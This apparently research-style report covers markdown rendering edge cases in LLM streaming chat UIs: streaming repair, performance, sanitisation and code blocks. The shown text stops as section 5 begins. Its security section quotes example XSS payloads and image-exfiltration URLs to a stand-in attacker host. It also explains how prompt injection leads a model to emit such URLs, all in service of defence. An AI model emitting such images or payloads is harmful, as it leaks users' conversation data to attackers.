# Markdown Edge Cases in an LLM Streaming Chat UI (react-markdown v10 + remark-gfm)

Scope note: all version claims below are for `react-markdown@10`, `remark-gfm@4`, `rehype-sanitize@6`. Where I cite a general rule (CommonMark/GFM), I link the spec section rather than a blog. Where a claim is my own reasoning rather than something I read in a source, it appears under **Inferences**, not **Cited Findings**.

---

## 1. Streaming: tokens arriving mid-construct

### Takeaway
`react-markdown` has no streaming mode — it is a pure function of the whole string, so every intermediate prefix is a *valid but unintended* markdown document. The industry answer is a **pre-pass that completes or neutralises the dangling construct before parsing** (Streamdown's `remend` is the reference implementation), plus **buffering at the transport layer for code-point boundaries** and **coalescing renders per animation frame**. There is no `streaming: true` flag to turn on.

### Cited Findings

**Unterminated fenced code block**

- Per CommonMark, a fenced code block that is never closed "is closed by the end of the document" — so an unclosed ``` ``` ``` does not throw, it makes *everything after it* code. ([CommonMark §4.5](https://spec.commonmark.org/0.31.2/#fenced-code-blocks))
- Consequently the visible failure is not an error but a **whole-message style flip**: prose after the fence opening renders monospace, and flips back (with a full reflow) the instant the closing fence arrives.
- Streamdown's documented fix is explicit: "The unterminated block parser ensures the code block renders properly even without the closing backticks," and it renders the code-block *shell* immediately with plain text, applying colours later. ([Streamdown: Code Blocks](https://streamdown.ai/docs/code-blocks); [Streamdown: Unterminated Block Parsing](https://streamdown.ai/docs/termination))
- Streamdown exposes `useIsCodeFenceIncomplete()`, which returns `true` only when (a) `isAnimating`, (b) the component is in the last, still-streaming block, and (c) that block has an unclosed fence — explicitly recommended for Mermaid and syntax highlighters "where continuous re-rendering during streaming would cause performance issues." ([Streamdown: Components](https://streamdown.ai/docs/components))

**Half-written link, emphasis, table row**

- Streamdown/remend enumerates the dangling constructs it repairs, each with a defined substitution: bold `**x` → closed `**x**`; italic `*x`/`_x`; bold-italic `***x`; inline code `` `x ``; strikethrough `~~x`; `$$…` math; and **links/images, which are replaced by a sentinel URL** — `[Click here](https://exampl` becomes `[Click here](streamdown:incomplete-link)` and `![Diagram](https://exampl` becomes `![Diagram](streamdown:incomplete-image)`. ([Streamdown: Unterminated Block Parsing](https://streamdown.ai/docs/termination))
- That sentinel is a real, usable pattern even without Streamdown: it turns "unclickable garbage link" into "styled text that becomes a link when it's real", and the docs give the exact `components.a` override for the standalone case (`if (href === 'streamdown:incomplete-link') return <>{children}</>`). Critically they warn: "If you render `remend` output with `react-markdown`, pass a `urlTransform` that keeps `streamdown:` URLs, because react-markdown's `defaultUrlTransform` replaces them with an empty string." ([Streamdown: Unterminated Block Parsing](https://streamdown.ai/docs/termination))
- remend also offers `linkMode: 'text-only'`, which renders `[Click here](https://exampl` as plain `Click here` "for better compatibility with other markdown renderers like react-markdown." ([Streamdown: Unterminated Block Parsing](https://streamdown.ai/docs/termination))
- remend guards against the classic false positives that make naive completers worse than nothing: it will not close a marker at the start of a list item, will not touch formatting inside *complete* code blocks, will not treat `_` inside math blocks as italic, escapes single `~` between word characters (`20~25°C` stays literal instead of becoming strikethrough), and preserves `*`/`_` inside words (`const user_name`, `234234*123`, `hello*world`). ([Streamdown: Unterminated Block Parsing](https://streamdown.ai/docs/termination))
- It also treats single tildes as a hazard for the same reason `remark-gfm` does: `singleTilde` defaults to `true`, so `~one~` *is* strikethrough by default even though "single tildes work on github.com, but are technically prohibited by GFM." ([remark-gfm readme, `Options`](https://github.com/remarkjs/remark-gfm))
- For tables specifically, the failure is a **layout jump**, not an error: GFM only recognises a table once the delimiter row (`| - | - |`) is present, so the header row first paints as an ordinary paragraph and then snaps into a `<table>` with different metrics. ([GFM spec, tables extension](https://github.github.com/gfm/))
- remend's handler pipeline is ordered and extensible (`singleTilde` 0 → `links` 20 → `boldItalic` 30 → `bold` 35 → `italic` 40–42 → `inlineCode` 50 → `strikethrough` 60 → `katex` 70), with `priority` and context helpers `isWithinCodeBlock` / `isWithinMathBlock` / `isWithinLinkOrImageUrl` / `isWordChar` exported so custom completers (e.g. `<source id="…">` tags) don't have to re-derive "am I inside a fence?". ([Streamdown: Unterminated Block Parsing](https://streamdown.ai/docs/termination))

**Split surrogate pairs / split emoji**

- JS strings are UTF-16; a chunk boundary inside an astral code point yields a **lone surrogate**, and the documented consequences are that it "breaks JSON, URLs and rendering" ([breakhound: surrogate pairs and split emoji](https://kwy404.github.io/breakhound/unicode-surrogate-pair-bugs.html)).
- A concrete, reproducible instance: Mastra's recursive chunker used `text.split('')`, which splits pairs; the fix was `Array.from(text)`, after which "the three runs above give 0 chunks with a lone surrogate, and the 6-emoji example becomes `['😀😀','😀😀','😀😀']`" ([mastra-ai/mastra issue #29268](https://github.com/mastra-ai/mastra/issues/29268)). The same class of bug is reported in OpenSearch's `FixedCharLengthChunker`, which cuts at fixed UTF-16 indexes with `String.substring` ([opensearch-project/neural-search #2060](https://github.com/opensearch-project/neural-search/issues/2060)).
- The DOM cannot hold a lone surrogate in a text node (text nodes are `USVString`, so the lone surrogate is coerced to U+FFFD), which is why the symptom on screen is a **flickering `�`** rather than a crash — while the *JavaScript state* keeps the half code point and corrupts any subsequent slicing, length check, or URL built from it. (Inference from the WebIDL `USVString` coercion rule; the "broken state persists" half is confirmed by the chunker bug reports above.)

**Debounce / batching: what real UIs actually do**

- Open WebUI was profiled at **~504 full markdown re-parses in a ~20 s stream** ("Full markdown parse: 504 times", "Markdown.svelte re-parsing on every chunk … triggered 502 times"), with KaTeX's regex tokenisation (`katex-extension.ts:159`, 401 calls) and `marked` tokenisation (451 calls) as the top costs, and Svelte's batch flush running 504 times where "Should ideally run ~60 times (one per frame @ 60fps)". ([open-webui discussion #20878](https://github.com/open-webui/open-webui/discussions/20878))
- The ranked remediation list in that thread, from a maintainer/collaborator, is the closest thing to an industry consensus I found: (1) "Buffer incoming chunks and update UI once per animation frame instead of per-chunk — 504 microtasks → ~60"; (2) "Only parse LaTeX math expressions after the entire response has been streamed"; (3) "Limit content updates to 50ms intervals instead of processing every chunk immediately — 504 updates → ~12-13 updates per second"; plus virtual scrolling, lazy code highlighting, and a worker. ([open-webui discussion #20878](https://github.com/open-webui/open-webui/discussions/20878))
- The same thread contains the counter-intuitive transport finding: raising the server-side **chunk buffer size to 5** "reduces re-renders by 5x", and the reporter's 504-renders-over-20 s profile was 30–100 tok/s content being delivered in bursts because nginx/LiteLLM/Redis/jitter batched the packets. So **batching upstream is as effective as debouncing downstream**. ([open-webui discussion #20878](https://github.com/open-webui/open-webui/discussions/20878))
- Streamdown instead absorbs burstiness *visually*: a 150 ms default per-word CSS animation with `animation-fill-mode: both`, and the docs say outright that this is to make batch arrivals "look smooth rather than 'chunky'", recommending `blurIn` and 200–300 ms "with fast-streaming models" because "blur masks batch arrivals better than opacity alone." ([Streamdown: Animation](https://streamdown.ai/docs/animation))

### Inferences
- The debounce interval is a UX tradeoff, not a correctness one, and 30–60 ms (≈2–4 frames) is the sweet spot implied by the Open WebUI numbers: it collapses 100+ tok/s into 16–33 updates/s, below the perceptual threshold for "typing", while `requestAnimationFrame` alone still runs at 60 Hz and only helps when chunks arrive faster than frames.
- `requestAnimationFrame` batching alone is *insufficient* when the expensive part (KaTeX, Shiki) exceeds the frame budget; the frame-aligned render then blows the budget every frame. You need frame batching **and** a "don't do the expensive thing while streaming" rule (defer math/highlighting to stream end or `requestIdleCallback`).
- A "complete the dangling construct" pre-pass is strictly better than "render everything as plain text until the fence closes", because the latter makes the whole message flicker between formatted and unformatted. Streamdown's own docs say disabling it "will result in incomplete Markdown syntax being displayed literally, which is generally not desirable."
- For surrogate pairs, buffer at the **byte/string boundary between transport and state**, before the string ever reaches React — repairing in the renderer is too late, because the corrupted string has already been concatenated into message state, and re-emitting the correct pair later duplicates half the glyph.

### Gaps
- I found no react-markdown GitHub issue that is specifically *about* streaming. A repo search for "streaming" returns 6 results, none of which is a streaming-rendering bug; the closest are #849 (components remounting when markdown changes) and #821 (custom components always re-rendered). ([react-markdown issues search](https://github.com/remarkjs/react-markdown/issues?q=streaming)) So "react-markdown issue about streaming" as a citation does not exist — the streaming discussion lives in downstream projects (Streamdown, Open WebUI, StreamMD), not upstream.
- I could not verify LibreChat's or assistant-ui's internal streaming strategy from a primary source within budget; the parent's brief named them but I have no citable detail, so I have omitted claims about them rather than guess.
- The widely repeated claim that "ChatGPT re-parses the whole string on every token" comes from a library author's marketing post ([StreamMD](https://dev.to/jvoltci/i-made-streaming-markdown-300x-faster-heres-the-architecture-4a9f)) and is asserted, not measured. Treat it as a plausible hypothesis, not a fact.

## 2. Performance: react-markdown re-parses the whole message every token

### Takeaway
Yes, it is O(n²) in the naive usage, and **react-markdown will not fix it for you** — maintainers explicitly declined to memoise by default. The mitigations, in order of leverage: (1) memoise per *message* so completed messages never re-render, (2) split the streaming message into **blocks** and freeze closed blocks, (3) coalesce updates per frame, (4) defer expensive transforms (math, highlight) to stream end. A worker is possible but forces you off `react-markdown`'s React-element output.

### Cited Findings
- The maintainer position on memoisation is explicit and still the design: `PureComponent`/`memo` "come with memory overhead, it becomes significant when each render comes with different content, which many/most `react-markdown` users will have. It should not be enabled by default." The same thread records the counter-experience — "I slapped a `React.memo` over my `Markdown` component, and performance instantly got WAY better" and "cuts down renders significantly (almost by an order of magnitude)" — and closes with "Rendering less is often a good approach to managing performance. Caching rarely is." ([react-markdown #621](https://github.com/remarkjs/react-markdown/issues/621))
- **The key algorithm was a real, fixed performance bug.** Keys were `${name}-${position.start.line}-${position.start.column}-${index}`; because `position.start.line` is in the key, "If a user enters a newline above the node, it will be presented to React as a new node … React will remove all that content from the DOM, and generate new HTML elements to add to the DOM." Fixed in **8.0.7** via [PR #738](https://github.com/remarkjs/react-markdown/pull/738), after a maintainer's counter-proposal to key on `tagName + '-' + counter`. ([react-markdown #703](https://github.com/remarkjs/react-markdown/issues/703)) Practical consequence for v10: inserting text near the top of a streaming message no longer remounts everything below it — but **any** re-parse still re-runs the whole pipeline, so this fixes DOM churn, not parse cost.
- **Block-level memoisation is the documented Streamdown architecture**: "Streamdown parses markdown content into individual blocks, with each block memoized separately … Only blocks with changed content are re-rendered. Unchanged blocks remain memoized, even if new blocks are added. Parsing is cached per block for efficiency." ([Streamdown: Memoization](https://streamdown.ai/docs/memoization))
- Streamdown also memoises at component level with a deliberately narrow prop list — `children`, `shikiTheme`, `isAnimating`, `animated`, `mode`, `plugins`, `className`, `linkSafety`, `normalizeHtmlIndentation` — and states "All other prop changes are ignored, ensuring optimal performance." ([Streamdown: Memoization](https://streamdown.ai/docs/memoization))
- Streamdown splits blocks "for parallel processing" in remend, i.e. the block split happens *before* parsing, on the raw string. ([Streamdown: Unterminated Block Parsing](https://streamdown.ai/docs/termination))
- A minimal, dependency-free version of the same idea, with real code: parse only the delta (`const newContent = fullText.slice(this.prevLength)`), classify each line into a block type, mark a block `closed: true` on blank line / new heading / closing fence, wrap each block in `React.memo`, so "On each token, only one component re-renders — the active (last, unclosed) block. Everything above it is frozen." The author measures ~400,000 chars parsed → ~1,300 for a 1,300-char, 15-block response. ([StreamMD architecture post](https://dev.to/jvoltci/i-made-streaming-markdown-300x-faster-heres-the-architecture-4a9f)) — note this is the author's own benchmark of his own library, so the ratio is indicative, not independent.
- The same post names the subtle bug in incremental block parsing that everyone hits: an incomplete line must **not** be committed to the block. `"## He"` then `"ading\n"` double-processes if you commit the prefix. Their fix is to keep `_incompleteLine` in a separate buffer, process only complete lines, and *virtually* append the pending line at render time: `displayContent = activeBlock.content + '\n' + incompleteLine`. ([StreamMD architecture post](https://dev.to/jvoltci/i-made-streaming-markdown-300x-faster-heres-the-architecture-4a9f))
- Reportedly slow custom components are a known separate cost: `sup` rendering with remark-gfm "is painfully slow" ([#827](https://github.com/remarkjs/react-markdown/issues/827)), and custom components are "always re-rendered" ([#821](https://github.com/remarkjs/react-markdown/issues/821)) / remounted when markdown changes ([#849](https://github.com/remarkjs/react-markdown/issues/849)).
- For "defer to `useDeferredValue`": React's documented semantics are that it returns a deferred copy of the value and lets the urgent render (the streaming append) commit first, with the deferred render interruptible. That is exactly the shape needed for "keep the text flowing, let the markdown lag". ([React: `useDeferredValue`](https://react.dev/reference/react/useDeferredValue))

### Inferences
- `useDeferredValue` on the markdown source is the cheapest correct win and requires zero restructuring: the token stream (URGENT) always wins, and the expensive `react-markdown` render is thrown away and restarted if a newer value arrives. It does **not** reduce total work — it reduces *dropped frames* and *wasted commits*. Combine with `React.memo` per message, not instead of it.
- Block splitting is the only mitigation that changes the asymptotics from O(n²) to ~O(n · open_blocks). It is also the only one that lets you keep finished blocks byte-identical, which matters because re-parsing can *change* the output of an already-displayed block (e.g. a footnote definition arriving later mutates an earlier footnote reference).
- A Web Worker is a worse trade than it looks for `react-markdown` specifically: `react-markdown` emits React elements, not HTML, so a worker must either (a) post back HTML and force `dangerouslySetInnerHTML` — a security regression that discards the library's main selling point — or (b) post back a serialised hast tree and rehydrate, which costs more than it saves for typical message sizes. Workers pay off for *math/highlighting* (KaTeX, Shiki), not for the remark parse.
- "Render partial text as plain text until a fence closes" is the wrong granularity: it degrades the *whole* message rather than the one open block. Restrict the plain-text fallback to the **last, unclosed block** only.
- Memoising per message must key on message `id`, not array index, or an edited/regenerated message will reuse the previous message's memo.

### Gaps
- No independent benchmark exists for react-markdown v10 streaming vs. Streamdown vs. StreamMD. Every number I found is self-reported by the library author (StreamMD) or a single user's Safari profile (Open WebUI).
- I did not find a documented production implementation that successfully runs `react-markdown` itself inside a worker.

## 3. Security

### Takeaway
`react-markdown`'s defaults are genuinely safe for the *markdown* path, but two things are outside its threat model and bite LLM UIs: **raw HTML if you opt into `rehype-raw`**, and **`<img src>` auto-fetch, which is silent data exfiltration that no amount of XSS sanitisation prevents**. The recommended stack is `rehype-raw` → `rehype-sanitize` (in that order) → a URL-prefix hardener such as `rehype-harden`/`harden-react-markdown`, with images restricted to first-party origins by default.

### Cited Findings

**Raw HTML**

- `react-markdown` "typically escapes HTML (or ignores it, with `skipHtml`)"; raw nodes are converted to text nodes rather than rendered. ([react-markdown readme, Appendix A](https://github.com/remarkjs/react-markdown); confirmed in source: `if (node.type === 'raw') … node.children[index] = {type: 'text', value: node.value}` in [`lib/index.js`](https://github.com/remarkjs/react-markdown/blob/main/lib/index.js))
- `rehype-raw` costs "±60kb minzipped" and is only appropriate "if you are in a trusted environment (you trust the markdown)". ([react-markdown readme, Appendix A](https://github.com/remarkjs/react-markdown))
- If you do enable it, sanitisation is mandatory and order matters: "Use `rehype-sanitize` after the last unsafe thing: everything after `rehype-sanitize` could be unsafe." ([rehype-sanitize readme, Security](https://github.com/rehypejs/rehype-sanitize))
- `rehype-sanitize`'s `defaultSchema` "Follows GitHub style sanitation" and **drops anything not explicitly allowed** — the readme's worked example turns `<div onmouseover=…><a href="jAva script:…"><img src="x" onerror=…><iframe src="javascript:…"><math><mi xlink:href="data:x,<script>…">` into `<div><a>delta</a><img src="x"></div>`, i.e. event handlers, the obfuscated `jAva script:` href, the iframe and the MathML payload all vanish. ([rehype-sanitize readme](https://github.com/rehypejs/rehype-sanitize))
- Schema guidance from the same readme, which is where most people go wrong: allow the *minimum* attribute; for math and highlighting, sanitise **first** with a narrow class allow-list and run `rehype-katex`/`rehype-highlight` **after** — "It is possible to pass a schema which allows MathML and inline styles, but it would be complex and allows *all* inline styles, which is unsafe." Concretely: `code: [['className', /^language-./, 'math-inline', 'math-display']]`, and for highlight tokens an explicit `span: [['className', 'hljs-addition', 'hljs-attr', …]]` list. ([rehype-sanitize readme, Examples](https://github.com/rehypejs/rehype-sanitize))
- `rehype-sanitize` also mitigates **DOM clobbering** by prefixing every `id` and `name` with `user-content-`, with a documented client-side `hashchange` shim to rewrite `#anchor` links to match. ([rehype-sanitize readme, "Example: headings (DOM clobbering)"](https://github.com/rehypejs/rehype-sanitize))
- `harden-react-markdown`'s readme adds the sharpest warning of the set: "While `harden-react-markdown` and related packages harden URLs inside markdown nodes, raw HTML injected via `rehype-raw` bypasses this layer — meaning untrusted HTML could still introduce data-exfiltration or XSS vectors," with the required `[rehypeRaw, rehypeSanitize]` ordering spelled out. ([vercel-labs/markdown-sanitizers](https://github.com/vercel-labs/markdown-sanitizers))

**Dangerous URL schemes**

- `defaultUrlTransform` "follows how GitHub works. It allows the protocols `http`, `https`, `irc`, `ircs`, `mailto`, and `xmpp`, and URLs relative to the current protocol (such as `/something`)." ([react-markdown readme, `defaultUrlTransform`](https://github.com/remarkjs/react-markdown))
- The implementation is a *scheme extraction + allow-list*, not a URL parse: it finds the first `:`, `?`, `#`, `/`; treats the string as relative if `:` is absent or if `:` appears after `/`, `?` or `#`; otherwise tests `safeProtocol = /^(?:https?|ircs?|mailto|xmpp)$/i` against the slice before the colon and returns `''` on failure. ([`lib/index.js`](https://github.com/remarkjs/react-markdown/blob/main/lib/index.js)) So `javascript:`, `data:`, `vbscript:`, `file:` all become `href=""`. It is applied to *every* attribute listed in `html-url-attributes` whose tag matches — i.e. `href`, `src`, `cite`, `action`, `formAction`, `poster`, `srcSet`, etc., not just `a[href]`.
- Because it returns `''` rather than dropping the element, **the link text and the element still render** (`<a href="">click</a>`), which is usually the desired behaviour but means an "empty href" is not a bug signal.
- `react-markdown`'s readme is blunt that overriding it is a footgun: "Overwriting `urlTransform` to something insecure will open you up to XSS vectors." ([react-markdown readme, Security](https://github.com/remarkjs/react-markdown))
- The recommended *stronger* override is origin/prefix allow-listing rather than scheme allow-listing, because scheme allow-listing still lets `https://attacker.example` through. `harden-react-markdown` blocks `javascript:`, `data:`, `vbscript:`, `file:` unconditionally — "regardless of configuration" and even under `allowedProtocols={['*']}` — and rewrites everything outside `allowedLinkPrefixes`. ([harden-react-markdown readme](https://github.com/vercel/harden-react-markdown))
- Its readme also flags two bypasses that prefix allow-lists must handle: "Prefix allow-lists can be circumvented with open redirects, so make sure … it is more secure to allow `https://example.com/images/` than … all of `https://example.com/`", and path traversal — "URLs may contain path traversal like `/../`. This package does not resolve these." ([harden-react-markdown readme](https://github.com/vercel/harden-react-markdown))

**Reverse tabnabbing / `target="_blank"`**

- `rel="noopener"` is what prevents the opened page from reaching back via `window.opener`; modern browsers imply `noopener` for `target="_blank"` on `<a>`, but the explicit attribute is still the documented, auditable form. ([MDN: rel=noopener](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/noopener))
- `react-markdown` does **not** add `target`/`rel` for you — `target` is not in the props it synthesises, and the v5-era `linkTarget` option was removed (it is in the `deprecations` list in [`lib/index.js`](https://github.com/remarkjs/react-markdown/blob/main/lib/index.js), mapping to the changelog entry `remove-linktarget`). So you must supply it via `components.a`. ([react-markdown readme, Appendix B](https://github.com/remarkjs/react-markdown); [`lib/index.js` deprecations](https://github.com/remarkjs/react-markdown/blob/main/lib/index.js))
- Streamdown's own docs model the correct component: `<a href={href} target="_blank" rel="noreferrer" {...props}>`. `noreferrer` implies `noopener` and also strips the `Referer` header, which additionally defeats referrer-based leak of the conversation URL to the destination. ([Streamdown: Unterminated Block Parsing](https://streamdown.ai/docs/termination); [MDN: rel=noopener](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/noopener))

**Image-based exfiltration (the one that actually matters for LLM output)**

- Streamdown's security page states the attack plainly: with permissive defaults, "an image such as `![](https://attacker.example/p?d=...)` is requested by the browser as soon as the message renders, with no user action. If a model's context contains attacker-controlled text (a fetched web page, a tool result, a stored record), prompt injection can make it emit such an image with conversation data in the URL." ([Streamdown: Security](https://streamdown.ai/docs/security))
- Mitigation #1, prefix allow-list plus `defaultOrigin`, with the explicit promise that blocked images are never fetched: "Images whose URL does not start with one of the allowed prefixes are not rendered, so the browser never requests them. This applies to both Markdown images (`![](...)`) and raw `<img>` tags." `rehype-harden` "throws if `allowedImagePrefixes` or `allowedLinkPrefixes` is set to anything other than `["*"]` without a `defaultOrigin`." ([Streamdown: Security](https://streamdown.ai/docs/security))
- Mitigation #2, kill `data:` images: `allowDataImages: false` "prevents embedding arbitrary image data in Markdown, which could be used for: tracking pixels, large embedded files, malicious payloads." ([Streamdown: Security](https://streamdown.ai/docs/security))
- Mitigation #3, a proxy, expressed as a one-liner `urlTransform`: `if (key === 'src') return 'https://your-cdn.com/proxy?url=' + encodeURIComponent(url)`. This keeps images working while making the *proxy* the only origin the browser talks to, so the attacker's server never sees the client IP and the proxy can strip query strings. ([Streamdown: Security](https://streamdown.ai/docs/security))
- Mitigation #4, CSP `img-src` — the only mitigation that survives a renderer bug, because it is enforced by the browser at fetch time rather than by the component tree. (Standard CSP; see [MDN CSP `img-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/img-src).)
- Vercel frames the class of attack as a first-class agent-security problem rather than a markdown problem: "exfiltration through model output" is named as one of the ways agents leak data. ([Vercel: Building secure AI agents](https://vercel.com/blog/building-secure-ai-agents); [vercel-labs/markdown-sanitizers](https://github.com/vercel-labs/markdown-sanitizers))

**DOMPurify vs rehype-sanitize; SVG/MathML; style attacks**

- The decisive architectural difference: `rehype-sanitize` runs on the **hast tree before React elements exist**, so it can only ever produce React elements — there is no HTML string to re-parse, no `innerHTML` sink, and no mutation-XSS surface. `DOMPurify` runs on an **HTML string** and must be paired with `dangerouslySetInnerHTML`, which reintroduces the sink `react-markdown` exists to avoid. ([react-markdown readme: "safe by default (no `dangerouslySetInnerHTML` or XSS attacks)"](https://github.com/remarkjs/react-markdown); [DOMPurify](https://github.com/cure53/DOMPurify))
- `rehype-sanitize` is the officially recommended one in this stack: "To make sure the content is completely safe, even after what plugins do, use `rehype-sanitize`. It lets you define your own schema of what is and isn't allowed." ([react-markdown readme, Security](https://github.com/remarkjs/react-markdown))
- `style` is the sharp edge in both. The Katex example shows the failure mode concretely: sanitising *after* `rehype-katex` strips its inline styles and classes and leaves semantically empty nested `<span>`s (`<span><span>LL</span>…</span>`); sanitising *before* and allowing "MathML and inline styles" is rejected as "complex and allows *all* inline styles, which is unsafe." ([rehype-sanitize readme, "Example: math"](https://github.com/rehypejs/rehype-sanitize))
- SVG and MathML are treated as hostile-by-default in that same example: the `<math><mi xlink:href="data:x,<script>…">` payload is stripped, and the docs' advice is to allow only the specific `class` names a trusted plugin emits rather than to enable the namespaces wholesale. ([rehype-sanitize readme](https://github.com/rehypejs/rehype-sanitize))
- `harden-react-markdown` states the guarantee your app actually needs: `data:` "URLs are never allowed in links, regardless of this setting" and only `data:image/*` (not `data:text/html`) is ever permitted, and only in `src`. ([harden-react-markdown readme](https://github.com/vercel/harden-react-markdown))

### Inferences
- For an LLM chat UI the correct default is: **no `rehype-raw` at all**. Model output has no legitimate need to emit HTML, and enabling it converts every sanitizer into a single point of failure. Only enable it for an explicit "render HTML artifact" feature, in a sandboxed iframe, never inline in the message.
- Image exfiltration is the highest-severity finding in this whole document and it is *not* an XSS bug: a perfectly sanitised `<img src="https://evil/?d=SECRET">` still leaks. Any review that checks only for `javascript:` has missed it.
- The `urlTransform` `''`-on-failure behaviour is a silent-failure design: an `<a href="">` looks like a broken link, not a blocked attack. Add a dev-mode `console.warn` inside a wrapped `urlTransform` when the input scheme was rejected, or you will never notice a model trying `file:` links.
- Do not allow `target="_blank"` without `rel="noopener noreferrer"`, and prefer rendering external links as `<a>` that opens in a new tab *and* displays the destination host next to it — the host display is the only user-visible defence against homoglyph/IDN spoofing (§6).
- Ordering rule to encode as a test: `rehypeSanitize` must be the **last** rehype plugin, and if `rehype-highlight`/`rehype-katex` must run after it, their class allow-list must be explicit and enumerated, not `['className', /.*/]`.

### Gaps
- I found no public postmortem from GitHub or VS Code specifically about markdown sanitisation bypasses; the sanitisation guidance I cite is the libraries' own docs. (GitHub's `html-pipeline` pipeline ordering is documented in [html-pipeline](https://github.com/gjtorikian/html-pipeline), but I did not verify a specific incident write-up.)
- Whether `DOMPurify` + `rehype-raw` is *ever* preferable is unresolved in my sources; the unified ecosystem's position is uniformly "sanitise the tree, not the string", but that is a position, not a benchmark.
- I did not find authoritative guidance on CSP for LLM output specifically; the `img-src` recommendation is my inference from the exfiltration mechanism described by Streamdown/Vercel.

## 4. Code blocks

### Takeaway
Code blocks are where "it renders" and "it is correct" diverge most: ANSI escapes are invisible-but-present, `\r\n`/`\r` corrupt copy and highlighting, tabs and very long lines break layout, and the language tag is attacker-controlled. None of this is `react-markdown`'s job — it is all in your `components.pre`/`components.code`.

### Cited Findings
- **Infinite/very long blocks are a rendering hazard, not a parsing one.** Streamdown caps code blocks at `codeBlockMaxHeight` 400px by default with vertical scroll, overridable per-instance (`240`, `'50vh'`, `0`/`Infinity`/`'none'` to disable), and keeps the block pinned to the bottom while `isAnimating` unless the user scrolls up, at which point auto-scroll "unpins until they return to the bottom (or a new streaming session starts)". ([Streamdown: Code Blocks](https://streamdown.ai/docs/code-blocks))
- **Copy buttons must be disabled while streaming**, because copying a half-written fence gives the user a truncated program: "Use the `isAnimating` prop to disable copy buttons while streaming … This prevents users from copying incomplete code." ([Streamdown: Code Blocks](https://streamdown.ai/docs/code-blocks))
- **Language tag spoofing is handled by lazy-loading + a supported-language check**: Streamdown/Shiki loads grammars on demand ("200+ programming languages … lazy-loaded on demand, so only the grammars you use are downloaded") and exposes `supportsLanguage(language)`; the code plugin interface is `highlight({code, language, themes}, callback?) => HighlightResult | null`, i.e. it may return `null`. ([Streamdown: Code Blocks](https://streamdown.ai/docs/code-blocks))
- **Highlighting must not be trusted to be fast**: the shell renders first with plain text and "syntax colors are applied when highlighting resolves … This keeps code readable on first paint and improves visual stability during lazy highlight loading." ([Streamdown: Code Blocks](https://streamdown.ai/docs/code-blocks))
- Non-code fences need an escape hatch: `codeBlockRawLanguages={["ascii", "diagram"]}` renders them "verbatim in a font that keeps every character on the same grid … bypassing syntax highlighting, line numbers and the code controls", with ligatures disabled. ([Streamdown: Code Blocks](https://streamdown.ai/docs/code-blocks))
- **ANSI escape sequences are a real injection vector, not just ugly text.** STÖK's DEF CON research showed ANSI sequences weaponised against terminal applications ([packetlabs: Weaponizing ANSI Escape Sequences](https://www.packetlabs.net/posts/weaponizing-ansi-escape-sequences/)); the general class is documented as manipulating colour, cursor position, line clearing and content hiding, "which can mislead operators or obscure malicious activity" ([ANSI escape sequence injection](https://nhimg.org/glossary/ansi-escape-sequence-injection/)). In an LLM context the specific risk is that model output frequently contains tool output / CI logs that already carry SGR codes, so the escapes are often *legitimate* — you cannot simply assume they are an attack.
- Stripping them correctly is non-trivial: "a regex to catch them all would be very large", and the recommended approach is a dedicated parser (`ansi2txt`, `strip-ansi`) rather than a hand-rolled regex ([Stack Overflow: how to strip ANSI escape sequences](https://stackoverflow.com/questions/23416278/how-to-strip-ansi-escape-sequences-from-a-variable)). Modern sequences include OSC 8 hyperlinks and OSC 52 clipboard writes, not just CSI colour ([flaviocopes: strip ANSI codes](https://flaviocopes.com/tools/tutorials/strip-ansi-codes/)).
- `react-markdown` itself does nothing about line endings: it hands you the text node's value verbatim; the readme's only guidance on line endings is about *authoring* markdown in JSX (put it in a template literal, don't indent it), not about CRLF in content. ([react-markdown readme, Appendix C](https://github.com/remarkjs/react-markdown))
- Streaming a code block means the content changes every token, so any component that re-highlights on every render will multiply the per-token cost by the grammar's complexity; Streamdown's answer is `useIsCodeFenceIncomplete()` to *not* highlight until the fence closes. ([Streamdown: Components](https://streamdown.ai/docs/components))

### Inferences
- **ANSI**: the right default is *strip on ingest, re-style with your own highlighter*. Rendering raw SGR in a browser is useless (browsers ignore it) but leaves the bytes in the clipboard, so the user pastes `\x1b[31m` into a shell and gets either colour or garbage. Use `strip-ansi` (or a CSI/OSC-aware parser) on the fence body before highlighting *and* before the copy handler, and special-case OSC 52 as a hard reject since it is a clipboard-write primitive.
- **CRLF/CR**: normalise `\r\n` and lone `\r` to `\n` before highlighting, and normalise again on copy. Lone `\r` is the nasty one — it is a *carriage return* in a terminal, so `progress\r100%` pastes as `100%` in a shell while displaying as `progress100%` in the browser. Highlighters keyed on `\n` will also mis-number lines if `\r` survives.
- **Tabs**: `tab-size` must be set explicitly on `<pre>` (4 is the CommonMark-conventional default) or the same snippet renders differently in the message, in the copy buffer, and in the user's editor; and tabs must never be converted to spaces in the copy buffer or Python/Python-adjacent code silently changes meaning.
- **Very long single lines** are worse than tall blocks: horizontal scroll inside a `<pre>` is a layout thrash source during streaming and defeats `content-visibility`. Wrap with `overflow-x:auto` on the `<pre>` only (not the page), and consider `white-space: pre` (not `pre-wrap`) so that copy fidelity is preserved — wrapping is a *display* concern, never a content mutation.
- **Language tag spoofing**: the attack is a fence like ` ```python ` on content that is actually 200 KB, or a language alias that maps to a pathological grammar. Defend with (a) an allow-list of languages you actually ship grammars for, (b) a length cap (e.g. skip highlighting above ~100 KB or ~2000 lines, render plain), (c) `supportsLanguage()` before calling the highlighter, and (d) a hard timeout on the highlight call. The `null` return in Streamdown's plugin signature is the shape you want: "cannot highlight this" must be a normal outcome, not an exception.
- **Highlighting timeout**: Shiki/Prism are synchronous and can block for hundreds of ms on pathological input, so a timeout cannot interrupt them — the only real defence is a *size/language pre-check* plus doing the work off the critical path (idle callback or worker). Do not rely on `Promise.race` with a timer; the parse will still have run.

### Gaps
- I found no source quantifying "enormous code block" thresholds (lines or bytes) at which browsers actually degrade; my 100 KB / 2000-line figures are rules of thumb, not measured.
- No source addresses CRLF/`\r` handling specifically in a *markdown chat* context; the terminal `\r` semantics are standard, the application to a chat UI is my inference.
- I did not find a documented "language tag spoofing" exploit for Shiki/Prism; the risk is inferred from lazy-loading behaviour and the existence of `supportsLanguage`/nullable-return APIs.

## 5. Markdown correctness gotchas

### Takeaway
Almost every "the model's markdown renders wrong" bug is the spec doing exactly what it says, and the fix is usually at the *prompt* or *post-processing* layer, not the renderer. The four that actually bite LLM output are: fences nested in lists/quotes (indentation-sensitive), `|` inside table code spans (must be escaped), autolink false positives (bare `www.`/emails), and footnote ID collisions *across messages on one page*.

### Cited Findings
